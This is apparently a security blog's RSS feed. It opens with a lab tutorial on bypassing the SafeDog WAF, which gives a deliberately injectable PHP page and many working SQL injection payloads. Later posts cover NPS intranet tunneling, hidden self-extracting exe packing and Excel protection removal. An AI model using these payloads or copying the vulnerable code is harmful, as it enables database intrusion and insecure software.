<p>硬件waf缺陷:对HTTP协议的兼容性不强,对异常报文会产生bug,导致绕过</p>
<h1 id="waf的核心原理">WAF的核心原理:</h1>
<ul>
<li>运用黑白思想</li>
<li>特征匹配,漏洞签名:特定特征的漏洞,比如stract2漏洞</li>
<li>对匹配结果进行响应(拦截,记录)</li>
</ul>
<h1 id="waf的几种部署模式">WAF的几种部署模式:</h1>
<h2 id="基于dns解析">基于DNS解析</h2>
<p>修改DNS,让域名解析到反向代理服务器,所有流量经过反向代理进行检测,检测无问题之后再转发给后端的web服务器
</p>
<h2 id="串联模式">串联模式</h2>
<p>一般指的是反向代理模式,透明代理模式.反向代理模式会改变原有的网络拓扑,真实客户端ip会以HTTP header传递给后端web server.透明代理模式可以在不改变原有网络拓扑结构的情况下直接部署.
</p>
<p></p>
<h2 id="旁路模式">旁路模式</h2>
<p>利用流量镜像技术,将业务流量分流给WAF产品,这种部署模式的优点是不会影响业务稳定性,所以WAF会投入更多的性能在检出率上面.但是缺点也很明显,不借助其他手段无法对检测出的攻击行为进行阻断.
</p>
<h2 id="软件嵌入中间件检测引擎模式">软件嵌入中间件+检测引擎模式</h2>
<p>在使用nginx作为反向代理的业务中,WAF提高nginx模块嵌入原有nginx,将请求转发给检测引擎,可以做到在不改动原有的网络拓扑的情况下完成检测任务
</p>
<h1 id="waf为什么会被绕过">WAF为什么会被绕过:</h1>
<ol>
<li>鱼(安全)和熊掌(业务性能)不能兼得,waf需要满足基本业务需求,所以一般不设置白名单之类的过于苛刻的操作</li>
<li>WAF为了考虑通用性的问题,无法100%覆盖某些语言,中间件,数据库等特性</li>
<li>硬件WAF自身往往存在漏洞
</li>
</ol>
<ul>
<li>架构:waf部署模式</li>
<li>规则缺陷/特性</li>
<li>协议:指HTTP0.9协议:TCP长连接</li>
</ul>
<h1 id="waf绕过实战-绕过安全狗进行注入">WAF绕过实战—-绕过安全狗进行注入</h1>
<p>所谓的bypass waf实际上是去寻找位于waf设备之后处理应用层数据包的硬件/软件的特性,利用特性构造waf不能命中,但是在应用程序能够执行成功的payload,绕过防护</p>
<h2 id="实验环境">实验环境:</h2>
<p>环境:安全狗Apache最新版
</p>
<p>本地测试代码(PHP):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
<span class="nv">$con</span> <span class="o">=</span> <span class="nx">mysql_connect</span><span class="p">(</span><span class="s2">&#34;localhost&#34;</span><span class="p">,</span><span class="s2">&#34;root&#34;</span><span class="p">,</span><span class="s2">&#34;root&#34;</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$con</span><span class="p">){</span><span class="k">die</span><span class="p">(</span><span class="s1">&#39;Could not connect: &#39;</span> <span class="o">.</span> <span class="nx">mysql_error</span><span class="p">());}</span>
<span class="nx">mysql_select_db</span><span class="p">(</span><span class="s2">&#34;dvwa&#34;</span><span class="p">,</span> <span class="nv">$con</span><span class="p">);</span>
<span class="nv">$query</span> <span class="o">=</span> <span class="s2">&#34;SELECT first_name,last_name FROM users WHERE user_id = &#39;</span><span class="si">$id</span><span class="s2">&#39;; &#34;</span><span class="p">;</span>
<span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span><span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;&lt;pre&gt;&#39;</span><span class="o">.</span><span class="nx">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s1">&#39;&lt;/pre&gt;&#39;</span><span class="p">);</span>
<span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span>
<span class="p">{</span> 
<span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;0&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&amp;nbsp&#34;</span> <span class="o">.</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;1&#39;</span><span class="p">];</span> 
<span class="k">echo</span> <span class="s2">&#34;&lt;br /&gt;&#34;</span><span class="p">;}</span><span class="k">echo</span> <span class="s2">&#34;&lt;br/&gt;&#34;</span><span class="p">;</span><span class="k">echo</span> <span class="nv">$query</span><span class="p">;</span>
<span class="nx">mysql_close</span><span class="p">(</span><span class="nv">$con</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="绕过拦截and-11">绕过拦截and 1=1</h2>
<p>首先先稍微测试一番,发现存在安全狗</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1  and 1=1%23
</code></pre></td></tr></table>
</div>
</div><p></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">and  1	拦截
and  &#39;1&#39;    拦截  
and  a	不拦截 
and  &#39;a&#39;    拦截  
and  !	不拦截 
and  1+1    拦截  
and  1+a    拦截  
and  hex(1)  不拦截
</code></pre></td></tr></table>
</div>
</div><p>通过测试我们发现当 and 后面跟上 数字型和字符型时他会给我们拦截掉 ，其实我们在安全狗的规则里面可以看到他拦截 and 和 or 所以我们有2个思路</p>
<ul>
<li>用其他字符替换 and 或者 or</li>
<li>带入的不是字符串和数字型，带入一个特殊符号</li>
<li></li>
</ul>
<p>针对第一种我们可以去看看运算符号 随便找到几个| ^ xor &amp; / * &amp;&amp; || 等等还有很多</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">与运算 a &amp; b  , 
或运算 a | b ,  
异或运算 a ^ b
</code></pre></td></tr></table>
</div>
</div><p>那么可以试着将and替换成&amp;&amp;,URL编码得到%26%26,将1=1替换成true或者false,发现可以成功绕过</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1&#39; %26%26 true%23
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>另外在分享一些可以绕过目前版本的安全狗测试payload (注:mysql支持&amp;&amp; || ,oracle不支持 &amp;&amp; ||）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1&#39;  || true%23         //将and 1=1替换为|| true,也可以绕过安全狗
http://127.0.0.1/test.php?id=1&#39;   ||(1) %23 		//使用括号代替空格绕过
//异或逻辑运算符xor，运算法则是：两个条件相同（同真或同假）即为假（0），两个条件不同即为真（1）
http://127.0.0.1/test.php?id=1&#39;  xor 1%23			
http://127.0.0.1/test.php?id=1&#39;  xor true%23
</code></pre></td></tr></table>
</div>
</div><h2 id="绕过order-by查询">绕过order by查询</h2>
<p>判断查询字段,使用mysql的<code>/*!*/</code>内敛注释去绕过防护,而其中的代码是可以正常执行的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1&#39; /*!order*//*!by*/2%23
</code></pre></td></tr></table>
</div>
</div><p></p>
<h2 id="绕过union-select查询">绕过union select查询</h2>
<p>使用union xxx页面正常
</p>
<p>但是用union和select放在在一起就被发现啦
</p>
<p>在网上找了好一阵子,发现有大佬提供的payload使用正则表达式去绕过</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1&#39;=/*!user () regexp 0x5e72*/--+
</code></pre></td></tr></table>
</div>
</div><p></p>
<ul>
<li>对于数字型注入,可以将其转换成浮点型</li>
<li>联合查询绕waf,%0a为换行符经过URL编码得到的,可以通过换行符进行绕过,</li>
<li>函数中可以插入任何混淆字符绕过waf</li>
<li>另外使用-1可以省去空格绕过waf</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,user--%0a()%23
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>基于报错信息的注入绕安全狗</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1&#39; and /*!12345updatexml!*/(1,concat(0x7e,version()))%23
http://127.0.0.1/test.php?id=1&#39; and /*!12345extractvalue!*/(1,concat(0x7e,version()))%23
</code></pre></td></tr></table>
</div>
</div><h2 id="绕过select-from">绕过select from</h2>
<p>使用大括号去绕过</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4From{information_schema.tables}
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>使用反引号去绕过</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4 From`information_schema.tables`
</code></pre></td></tr></table>
</div>
</div><p>使用\N去绕过</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,\Nfrom information_schema.tables
</code></pre></td></tr></table>
</div>
</div><p>括号法去绕过</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,From(((information_schema.tables)))
</code></pre></td></tr></table>
</div>
</div><p>也可以组合起来</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="o">/</span><span class="n">test</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="w"> </span><span class="cm">/*union/*!select-1*/,2,3,4\Nfrom{a`information_schema`.tables}
</span></code></pre></td></tr></table>
</div>
</div><p>这些都是去掉空格的合法语句,当然如果不拦截<code>/*/或/!*/</code>的话,也可以尝试这两个</p>
<blockquote>
<p>提示，安全狗默认不开启对information_schema的拦截，如果开启了，那么就得找支持post传递数据的注入点了，post下不拦截information_schema这个关键词。</p>
</blockquote>
<p>补充点
php+mysql环境下支持的空格有：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">%0a,%0b,%0c,%0d,%20,%09,%a0,/**/
</code></pre></td></tr></table>
</div>
</div><p>其中使用的最多的就是<code>%0a,%0b,%a0,/**/</code>，这四个当作空格插入在语句中来扰乱waf检测。
干货分享：使用<code>/^!$asd%2a–=/</code>代替空格即可，找到sqlmap中tamper目录下的space2plus.py文件，将其中代替空格的<code>/*/换成/^!$asd%2a–=*/</code>即可使用sqlmap跑了。</p>
<h2 id="缓冲区溢出绕waf">缓冲区溢出绕waf</h2>
<p>另外也可以对安全狗实行缓冲区溢出绕waf
缓冲区溢出用于对WAF，有不少WAF是C写的，而C语言本身没有缓冲区保护机制，因此如果WAF在处理测试量时超出其缓冲区长度，就会引发bug从而实现绕过
要求是(针对于安全狗而已):
GET类型请求转换成POST类型
Content-Length头长度大于4008
正常参数放置在脏数据后面</p>
<p></p>]]></description>
</item><item>
    <title>NPS内网穿透配置</title>
    <link>https://www.bysec.cn/20201101/</link>
    <pubDate>Sun, 01 Nov 2020 00:00:00 &#43;0000</pubDate><author>
        <name>bysec</name>
    </author><guid>https://www.bysec.cn/20201101/</guid>
    <description><![CDATA[<h1 id="nps内网穿透配置nps">NPS内网穿透配置NPS</h1>
<h2 id="github项目地址">github项目地址</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">https://github.com/cnlh/nps
</code></pre></td></tr></table>
</div>
</div><h2 id="原理">原理</h2>
<p></p>
<h2 id="服务器端配置">服务器端配置</h2>
<ul>
<li>准备工作
<ul>
<li>一台拥有公网IP的VPS</li>
<li>安装nps软件包</li>
</ul>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">wget https://github.com/cnlh/nps/releases/download/v0.23.1/linux_amd64_server.tar.gz
tar -zxvf linux_amd64_server.tar.gz
<span class="nb">cd</span> nps/
./nps start
</code></pre></td></tr></table>
</div>
</div><ul>
<li>配置server端
在安装完成，启动nps后，便可访问server_IP:8080来访问nps配置dashboard了
要求登陆，默认的用户名：admin，密码：123
</li>
</ul>
<p>网页dashboard的用户名和密码可在nps/conf/nps.conf配置文件中的web模块中修改
</p>
<p>登陆进入dashboard后,看到界面，默认客户端为0（这里我已经创建了一个）
默认的客户端链接端口为8024（该端口为客户端用于链接服务器的端口，来保持链接，原理与反向代理相似）
</p>
<ul>
<li>新建客户端
这里我们创建一个新的客户端，
这里的客户端只是在server配置的客户端，之后使用客户端软件链接，所以要与客户端配置一致
</li>
</ul>
<p>创建好的客户端是这样的，status为offline，因为客户端还没链接
这里server会自动随机生成一个vkey=7oswclqe5knqu15x（之后配置客户端会使用）
</p>
<hr>
<h2 id="客户端配置">客户端配置</h2>
<p><strong>Windows</strong></p>
<ul>
<li>下载客户端
<a href="https://github.com/cnlh/nps/releases/download/v0.23.1/win_amd64_client.tar.gz" target="_blank" rel="noopener noreffer">https://github.com/cnlh/nps/releases/download/v0.23.1/win_amd64_client.tar.gz</a>
这里使用windows作为客户端
下载解压后配置vps.conf，
将其他配置删除，只保留如图所示的配置</li>
<li>修改
server_addr为VPS的公网ip和dashboard的默认客户端链接端口
vkey为server网页上新建的客户端生成的vkey</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">server_addr=server_IP:8024
conn_type=tcp
vkey=7oswclqe5knqu15x
auto_reconnection=true
max_conn=1000
flow_limit=1000
rate_limit=1000
basic_username=11
basic_password=3
web_username=user
web_password=123
crypt=true
compress=true
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>修改完配置文件后运行nsp.exe，显示成功链接
</p>
<h2 id="centos">CentOS</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">wget https://github.com/cnlh/nps/releases/download/v0.23.1/linux_amd64_client.tar.gz
tar -zxvf linux_amd64_client.tar.gz
<span class="nb">cd</span> npc/
./npc -server<span class="o">=</span>66.42.81.9:8024 -vkey<span class="o">=</span>7oswclqe5knqu15x -type<span class="o">=</span>tcp
</code></pre></td></tr></table>
</div>
</div><p>链接成功
<strong>两者链接成功后server端中客户端status转为online</strong>
</p>
<h2 id="使用测试">使用测试</h2>
<p>创建tcp tunnel
这里使用内网router配置网页做测试
</p>
<p>点击tunnel创建tcp隧道
</p>
<p>点击新增
这里我的router内网ip为192.168.1.1
</p>
<p>创建完成
</p>
<p>访问测试
访问server_ip:10001
成功访问到内网router配置网页
</p>
<blockquote>
<p>中文文档： <a href="https://github.com/ehang-io/nps/blob/master/README_zh.md">https://github.com/ehang-io/nps/blob/master/README_zh.md</a></p>
</blockquote>]]></description>
</item><item>
    <title>使用好压打包成单个exe文件</title>
    <link>https://www.bysec.cn/20201001/</link>
    <pubDate>Thu, 01 Oct 2020 00:00:00 &#43;0000</pubDate><author>
        <name>bysec</name>
    </author><guid>https://www.bysec.cn/20201001/</guid>
    <description><![CDATA[<blockquote>
<p>在线抠图：<a href="https://www.remove.bg" target="_blank" rel="noopener noreffer">https://www.remove.bg</a></p>
</blockquote>
<blockquote>
<p>png转ico：<a href="https://www.easyicon.net/covert" target="_blank" rel="noopener noreffer">https://www.easyicon.net/covert</a></p>
</blockquote>
<h2 id="准备">准备</h2>
<ul>
<li>准备个压缩软件，例如好压，WinRAR等等，根据文字举一反三即可</li>
<li>这是将要打包的主目录文件</li>
</ul>
<p></p>
<p></p>
<p>exe在哪里就复制哪里的相对路径，以主文件目录为准，一定要相对路径，否则移动到别的地方会无法使用</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">\Program\Thunder.exe
</code></pre></td></tr></table>
</div>
</div><p></p>
<h2 id="打包exe">打包exe</h2>
<ol>
<li>选择-压缩文件格式</li>
<li>勾选-创建自解压格式</li>
<li>点击-自解压选项
</li>
<li>选项卡选择-解压</li>
<li>解压后运行-输入相对路径</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">\Program\Thunder.exe
</code></pre></td></tr></table>
</div>
</div><p></p>
<blockquote>
<p>强调下，一定要相对路径否则移动到别处会无法使用</p>
</blockquote>
<ol start="6">
<li>
<p>选项卡选择-模式</p>
</li>
<li>
<p>勾选-解包到临时文件夹</p>
</li>
<li>
<p>选择-全部隐藏
</p>
</li>
<li>
<p>选项卡选择-更新</p>
</li>
<li>
<p>解压并替换文件</p>
</li>
<li>
<p>覆盖所有文件
</p>
</li>
<li>
<p>选项卡选择-图标</p>
</li>
<li>
<p>浏览选择绝对路径的ico图标文件
</p>
</li>
</ol>
<h2 id="完成">完成</h2>
<p></p>
<p>打包好后删除了主文件只保留exe文件后移动到别处也可以使用
</p>]]></description>
</item><item>
    <title>搭建OneDrive云盘</title>
    <link>https://www.bysec.cn/20200901/</link>
    <pubDate>Tue, 01 Sep 2020 00:00:00 &#43;0000</pubDate><author>
        <name>bysec</name>
    </author><guid>https://www.bysec.cn/20200901/</guid>
    <description><![CDATA[<h2 id="国际版">国际版</h2>
<blockquote>
<p>国际版就是微软官网那些都是国际版的，速度比世纪互联版差，有些地方需要梯子，敏感东西不会被和谐。</p>
</blockquote>
<h3 id="microsoft-onedrivehttpsonedrivelivecom"><a href="https://onedrive.live.com/" target="_blank" rel="noopener noreffer">Microsoft OneDrive</a></h3>
<h3 id="microsoft-azurehttpsportalazurecom"><a href="https://portal.azure.com/" target="_blank" rel="noopener noreffer">Microsoft Azure</a></h3>
<h1 id="世纪互联版">世纪互联版</h1>
<blockquote>
<p>世纪互联版，只能企业注册，无法个人注册，速度很快，都不需要梯子，有些敏感东西会被和谐。</p>
</blockquote>
<h3 id="microsoft-onedrivehttpsloginpartnermicrosoftonlinecn"><a href="https://login.partner.microsoftonline.cn/" target="_blank" rel="noopener noreffer">Microsoft OneDrive</a></h3>
<h3 id="microsoft-azurehttpsportalazurecn"><a href="https://portal.azure.cn/" target="_blank" rel="noopener noreffer">Microsoft Azure</a></h3>
<hr>
<h2 id="获取id和key">获取ID和Key</h2>
<p></p>
<p></p>
<p></p>
<p></p>
<p></p>
<p></p>
<p></p>]]></description>
</item><item>
    <title>Hugo添加gitalk评论</title>
    <link>https://www.bysec.cn/20200801/</link>
    <pubDate>Sat, 01 Aug 2020 00:00:00 &#43;0000</pubDate><author>
        <name>bysec</name>
    </author><guid>https://www.bysec.cn/20200801/</guid>
    <description><![CDATA[<h2 id="注册-github-application">注册 GitHub Application</h2>
<p><strong>首先要注册一下 GitHub Application</strong></p>
<p><a href="https://github.com/settings/applications/new" target="_blank" rel="noopener noreffer">https://github.com/settings/applications/new</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">Application name 随便填
Homepage URL https://[name].github.io/
Authorization callback URL 有自己域名就写自己域名没就写 https://[name].github.io/
</code></pre></td></tr></table>
</div>
</div><p><strong>写完后最下面 Update application 按钮点击提交</strong></p>
<p></p>
<h2 id="获取-client-id-和-client-secrets">获取 Client ID 和 Client secrets</h2>
<p><strong>提交后当前页面找到 Generate a new client secret 点击生成 Client secrets</strong></p>
<p><strong>复制 Client ID 和 Client secrets 保存好</strong></p>
<p></p>
<h2 id="填写配置信息">填写配置信息</h2>
<p><strong>我的的Hugo-LoveIt主题，别的主题也差不多看主要关键字填写信息就好</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-toml" data-lang="toml"><span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">page</span><span class="p">.</span><span class="nx">comment</span><span class="p">.</span><span class="nx">gitalk</span><span class="p">]</span>
<span class="nx">enable</span> <span class="p">=</span> <span class="kc">true</span> <span class="c"># 开启</span>
<span class="nx">owner</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span> <span class="c"># owner指的是你的GitHub名字</span>
<span class="nx">repo</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span> <span class="c"># repo写你的项目名</span>
<span class="nx">clientId</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span> <span class="c"># 上面复制的 clientId</span>
<span class="nx">clientSecret</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span> <span class="c"># 上面复制的 clientSecret</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="填坑">填坑</h2>
<ol>
<li>
<p>一开始是默认没有任何issues的，配置正确无报错的情况下，你要登录自己GitHub账号在那个页面刷新下才会生成新的issues，每个页面都需要这样，否则别人是评论不了的。</p>
</li>
<li>
<p>issues一般是默认开启，如果没反应可以去检查下是否开启。项目文件-Settings-Options-Features下的 Issues 勾选即可。</p>
</li>
</ol>]]></description>
</item><item>
    <title>Excel解除工作表密码保护</title>
    <link>https://www.bysec.cn/20171001/</link>
    <pubDate>Sun, 01 Oct 2017 00:00:00 &#43;0000</pubDate><author>
        <name>bysec</name>
    </author><guid>https://www.bysec.cn/20171001/</guid>
    <description><![CDATA[<h2 id="复制代码">复制代码</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-vb" data-lang="vb"><span class="k">Sub</span> <span class="nf">DeletePW</span><span class="p">()</span>
<span class="n">ActiveSheet</span><span class="p">.</span><span class="n">Protect</span> <span class="n">DrawingObjects</span><span class="p">:</span><span class="o">=</span><span class="k">True</span><span class="p">,</span> <span class="n">Contents</span><span class="p">:</span><span class="o">=</span><span class="k">True</span><span class="p">,</span> <span class="n">AllowFiltering</span><span class="p">:</span><span class="o">=</span><span class="k">True</span>
<span class="n">ActiveSheet</span><span class="p">.</span><span class="n">Protect</span> <span class="n">DrawingObjects</span><span class="p">:</span><span class="o">=</span><span class="k">False</span><span class="p">,</span> <span class="n">Contents</span><span class="p">:</span><span class="o">=</span><span class="k">True</span><span class="p">,</span> <span class="n">AllowFiltering</span><span class="p">:</span><span class="o">=</span><span class="k">True</span>
<span class="n">ActiveSheet</span><span class="p">.</span><span class="n">Protect</span> <span class="n">DrawingObjects</span><span class="p">:</span><span class="o">=</span><span class="k">True</span><span class="p">,</span> <span class="n">Contents</span><span class="p">:</span><span class="o">=</span><span class="k">True</span><span class="p">,</span> <span class="n">AllowFiltering</span><span class="p">:</span><span class="o">=</span><span class="k">True</span>
<span class="n">ActiveSheet</span><span class="p">.</span><span class="n">Protect</span> <span class="n">DrawingObjects</span><span class="p">:</span><span class="o">=</span><span class="k">False</span><span class="p">,</span> <span class="n">Contents</span><span class="p">:</span><span class="o">=</span><span class="k">True</span><span class="p">,</span> <span class="n">AllowFiltering</span><span class="p">:</span><span class="o">=</span><span class="k">True</span>
<span class="n">ActiveSheet</span><span class="p">.</span><span class="n">Unprotect</span>
<span class="k">End</span> <span class="k">Sub</span>
</code></pre></td></tr></table>
</div>
</div><hr>
<p></p>
</br>
<p></p>]]></description>
</item><item>
    <title>Python通过selenium获取cookie</title>
    <link>https://www.bysec.cn/20170901/</link>
    <pubDate>Fri, 01 Sep 2017 00:00:00 &#43;0000</pubDate><author>
        <name>bysec</name>
    </author><guid>https://www.bysec.cn/20170901/</guid>
    <description><![CDATA[<h2 id="实例">实例</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">selenium</span> <span class="kn">import</span> <span class="n">webdriver</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">json</span>
 
 
<span class="n">options</span> <span class="o">=</span> <span class="n">webdriver</span><span class="o">.</span><span class="n">FirefoxOptions</span><span class="p">()</span>
<span class="n">dr</span> <span class="o">=</span> <span class="n">webdriver</span><span class="o">.</span><span class="n">Firefox</span><span class="p">(</span><span class="n">options</span><span class="o">=</span><span class="n">options</span><span class="p">)</span>
 
<span class="n">dr</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://cn.bing.com/search?q=objective</span><span class="si">%20le</span><span class="s1">ns</span><span class="si">%20o</span><span class="s1">f</span><span class="si">%20c</span><span class="s1">ompound%20microscope&amp;qs=ds&amp;form=QBRE&#39;</span><span class="p">)</span>
 
<span class="n">cookie_test</span> <span class="o">=</span> <span class="n">dr</span><span class="o">.</span><span class="n">get_cookies</span><span class="p">()</span>
<span class="c1"># 未整理的cookie</span>
